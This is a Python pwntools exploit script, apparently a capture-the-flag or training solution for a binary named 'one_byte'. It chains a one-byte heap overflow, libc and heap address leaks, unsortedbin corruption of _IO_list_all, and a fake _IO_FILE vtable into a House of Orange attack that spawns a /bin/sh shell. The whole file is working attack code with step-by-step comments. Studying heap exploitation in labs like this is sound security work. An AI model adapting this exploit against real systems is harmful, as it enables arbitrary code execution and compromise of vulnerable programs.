#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("one_byte")
libc = ELF(elf.runpath + b"/libc.so.6") # elf.libc broke again

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the "malloc" option.
# Returns chunk index.
def malloc():
    global index
    io.sendthen(b"> ", b"1")
    index += 1
    return index - 1

# Select the "free" option; send index.
def free(index):
    io.send(b"2")
    io.sendafter(b"index: ", f"{index}".encode())
    io.recvuntil(b"> ")

# Select the "edit" option; send index & data.
def edit(index, data):
    io.send(b"3")
    io.sendafter(b"index: ", f"{index}".encode())
    io.sendafter(b"data: ", data)
    io.recvuntil(b"> ")

# Select the "read" option; read 0x58 bytes.
def read(index):
    io.send(b"4")
    io.sendafter(b"index: ", f"{index}".encode())
    r = io.recv(0x58)
    io.recvuntil(b"> ")
    return r

io = start()
io.recvuntil(b"> ")
io.timeout = 0.1

# =============================================================================

# =-=-=- LEAK THE UNSORTEDBIN ADDRESS -=-=-=

# Request a chunk to overflow from.
overflow = malloc()

# Request 2 chunks to aggregate.
# The "tamper" chunk's size field will be tampered with via the overflow.
# The "leaker" chunk is used to leak heap & libc addresses.
tamper = malloc()
leaker = malloc()

# Make space for a fake _IO_FILE struct, the "fake_vtable" chunk will hold a fake vtable.
malloc()
fake_vtable = malloc()

# Leverage the single-byte overflow to modify the "tamper" chunk's size field.
# Set it to the sum of the "tamper" & "leaker" chunks.
edit(overflow, b"Y"*0x58 + p8(0xc1))

# Free the "tamper" chunk into the unsortedbin.
free(tamper)

# The next request will remainder the "tamper" chunk, writing unsortedbin metadata into the "leaker" chunk.
tamper = malloc()

# Leak the unsortedbin address via the "leaker" chunk.
libc.address = u64(read(leaker)[:8]) - (libc.sym.main_arena + 0x58)
info(f"libc @ 0x{libc.address:02x}")


# =-=-=- LEAK A HEAP ADDRESS -=-=-=

# Request a chunk that overlaps the "leaker" chunk.
overlap = malloc()

# Free the "overflow" and "overlap" chunks, writing fastbin metadata into the "leaker" chunk.
free(overflow)
free(overlap)

# Leak a heap address via the "leaker" chunk.
heap = u64(read(leaker)[:8])
info(f"heap @ 0x{heap:02x}")


# =-=-=- PREPARE A HOUSE OF ORANGE PRIMITIVE -=-=-=

# To leverage the overflow again, request the "overflow" chunk that was previously freed.
# The 1st chunk overlaps the "leaker" chunk, the 2nd is the "overflow" chunk.
malloc()
overflow = malloc()

# Overflow into the "tamper" chunk again, setting its size field to the same value as the first time.
edit(overflow, b"Y"*0x58 + p8(0xc1))

# Free the "tamper" chunk into the unsortedbin.
free(tamper)

# The next request will remainder the "tamper" chunk, writing unsortedbin metadata into the "leaker" chunk.
tamper = malloc()

# The allocated "leaker" chunk can be used to overwrite the unsortedbin metadata overlapping its user data.
# Set the unsortedbin bk to _IO_list_all - 0x10 and set up a file stream exploit.
edit(leaker, p64(0) + p64(libc.sym._IO_list_all - 0x10) + p64(0) + p64(1))

# Write the string "/bin/sh" into the last quadword of the "tamper" chunk's user data.
# Leverage the overflow to change the unsorted chunk's size field to 0x69 (or 0xb1).
edit(tamper, p64(0)*10 + b"/bin/sh\0" + p8(0x69))

# Prepare the fake _IO_FILE vtable pointer and corresponding vtable _overflow entry.
edit(fake_vtable, p64(libc.sym.system) + p64(heap + 0x178))

# Call malloc to trigger the House of Orange primitive and drop a shell.
malloc()

# =============================================================================

io.interactive()
